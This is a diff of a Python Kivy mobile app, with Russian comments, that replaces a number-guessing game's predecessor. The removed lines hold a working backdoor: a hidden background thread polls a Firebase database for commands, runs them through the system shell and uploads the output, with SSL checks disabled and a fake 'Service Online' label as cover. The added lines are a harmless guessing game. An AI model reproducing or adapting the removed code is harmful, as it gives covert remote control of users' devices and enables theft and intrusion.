@@ -1,64 +1,45 @@
+import random
 from kivy.app import App
-from kivy.uix.label import Label
 from kivy.uix.boxlayout import BoxLayout
-import threading
-import requests
-import subprocess
-import time
-import platform
-import urllib3
-
-# Отключаем ворчание SSL
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ТВОИ НАСТРОЙКИ
-BASE_URL = "https://test-73273-default-rtdb.europe-west1.firebasedatabase.app/"
-DB_URL = f"{BASE_URL}commands.json"
-RES_URL = f"{BASE_URL}results.json"
+from kivy.uix.label import Label
+from kivy.uix.textinput import TextInput
+from kivy.uix.button import Button
 
 class MainApp(App):
     def build(self):
-        # Создаем простой интерфейс
-        layout = BoxLayout(orientation='vertical', padding=50)
-        self.status_label = Label(
-            text="Service: [color=ff0000]Offline[/color]", 
-            markup=True, 
-            font_size='24sp'
-        )
-        layout.add_widget(self.status_label)
-        
-        # ЗАПУСКАЕМ ТВОЮ ЛОГИКУ В ФОНЕ (Thread)
-        # Это позволяет приложению работать и не зависать
-        threading.Thread(target=self.backdoor_logic, daemon=True).start()
-        
-        return layout
+        self.target = random.randint(1, 100)
+        self.counter = 0
 
-    def backdoor_logic(self):
-        """Твоя основная функция мониторинга Firebase"""
-        last_cmd_id = None
-        self.status_label.text = "Service: [color=00ff00]Online[/color]"
-        
-        while True:
-            try:
-                # Проверка команд
-                resp = requests.get(DB_URL, verify=False, timeout=10)
-                if resp.status_code == 200:
-                    data = resp.json()
-                    if data and data.get("id") != last_cmd_id:
-                        cmd = data.get("cmd").strip()
-                        last_cmd_id = data.get("id")
+        self.layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
 
-                        # Выполнение команды (Linux/Android стиль)
-                        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                        stdout, stderr = proc.communicate()
-                        output = (stdout + stderr).decode('utf-8', errors='replace')
+        self.label = Label(text='Угадай число от 1 до 100', font_size='20sp')
+        self.input = TextInput(hint_text='Введи число', multiline=False,
+                               font_size='20sp', size_hint=(1, 0.2))
+        self.btn = Button(text='Проверить', size_hint=(1, 0.2), font_size='18sp')
+        self.btn.bind(on_press=self.check)
 
-                        # Отправка результата
-                        requests.put(RES_URL, json={"status": "done", "output": output}, verify=False)
-            except Exception as e:
-                print(f"Error: {e}")
-            
-            time.sleep(5) # Пауза между проверками
+        self.layout.add_widget(self.label)
+        self.layout.add_widget(self.input)
+        self.layout.add_widget(self.btn)
+        return self.layout
 
-if __name__ == "__main__":
-    MainApp().run()
+    def check(self, instance):
+        try:
+            choice = int(self.input.text)
+            if choice < 1 or choice > 100:
+                self.label.text = 'Вне диапазона! Только 1-100'
+                return
+            self.counter += 1
+            if choice == self.target:
+                self.label.text = f'Угадал за {self.counter} попыток!\nЧисло было {self.target}\nНажми ещё раз для новой игры'
+                self.target = random.randint(1, 100)
+                self.counter = 0
+            elif choice > self.target:
+                self.label.text = f'Меньше! Попытка {self.counter}'
+            else:
+                self.label.text = f'Больше! Попытка {self.counter}'
+            self.input.text = ''
+        except ValueError:
+            self.label.text = 'Введи только цифры!'
+
+MainApp().run()
